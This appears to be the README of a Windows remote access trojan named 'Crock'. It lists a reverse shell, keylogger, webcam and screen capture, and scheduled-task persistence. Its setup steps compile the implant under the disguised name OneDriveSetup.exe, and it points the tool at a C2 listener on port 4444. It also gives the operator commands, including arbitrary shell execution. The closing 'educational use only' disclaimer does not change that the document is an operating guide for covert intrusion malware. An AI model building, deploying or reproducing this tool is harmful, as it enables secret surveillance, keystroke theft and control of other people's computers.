# Crock
Remote access tool with web control panel.  
Supports reverse shell, screenshots, webcam, process list, keylogger, screen stream and persistence.

## Features
- Reverse shell
- Screenshot
- Webcam photo
- Process list
- Keylogger (start / dump / stop / clear)
- Screen stream
- Persistence (scheduled task)
- Encrypted channel
- Web control panel

## Requirements
- Linux (Kali / Ubuntu / Debian) — server
- Windows 10/11 — target
- Python 3.10+
- mingw-w64

## Install dependencies
```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv g++-mingw-w64-x86-64
python3 -m venv venv
source venv/bin/activate
pip install flask
```

## Setup
1. Activate the environment:
```bash
source venv/bin/activate
```
2. Edit `HOST` in `implant.cpp` if needed (default `192.168.122.1`).
3. Build the implant:
```bash
x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe -static -s -O2 -mwindows -lws2_32 -lgdi32 -luser32 -lshell32 -ladvapi32 -lvfw32
```
4. Make sure `dashboard.html` is in the same folder as `server.py`.

## Run
```bash
source venv/bin/activate
python3 server.py
```
- Listener: `0.0.0.0:4444`
- Web UI: `http://127.0.0.1:5000`

## Usage
1. Start `server.py`.
2. Run `OneDriveSetup.exe` on the Windows machine.
3. Open `http://127.0.0.1:5000`.
4. Select the client and use the panel.

## Commands
- Command,Action
- info,Client information
- screenshot,Take screenshot
- webcam,Webcam photo
- proclist,List processes
- keylog_start,Start keylogger
- keylog_dump,Dump keylogger buffer
- keylog_stop,Stop keylogger
- keylog_clear,Clear keylogger buffer
- stream_start,Start screen stream
- stream_stop,Stop screen stream
- persist,Add scheduled task
- sh:<cmd>,Execute shell command

## Notes
- Web UI listens only on localhost.
- Default C2 address is `192.168.122.1:4444`.
- Persistence uses a scheduled task (highest if elevated).
- Lab / authorized use only.

## Disclaimer
For educational and research purposes only.
